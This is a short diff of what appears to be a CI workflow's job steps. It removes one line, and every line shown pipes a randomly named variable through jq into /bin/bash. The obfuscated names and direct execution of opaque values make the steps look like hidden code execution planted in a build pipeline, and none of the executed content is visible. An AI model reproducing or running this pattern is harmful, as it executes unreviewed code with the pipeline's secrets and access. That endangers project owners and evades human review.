@@ -34,7 +34,6 @@ jobs:
           echo $wxw92 | jq -r .as0922 | /bin/bash
           echo $cckx5316 | jq -r .zc5 | /bin/bash
           echo $olob978 | jq -r .mahv29145 | /bin/bash
-          printf '%s' "$o3" | jq -r .mpaa0 | /bin/bash
           echo $skw6617 | jq -r .f3771 | /bin/bash
           echo $gca87 | jq -r .o56 | /bin/bash
           echo $w08 | jq -r .h858 | /bin/bash
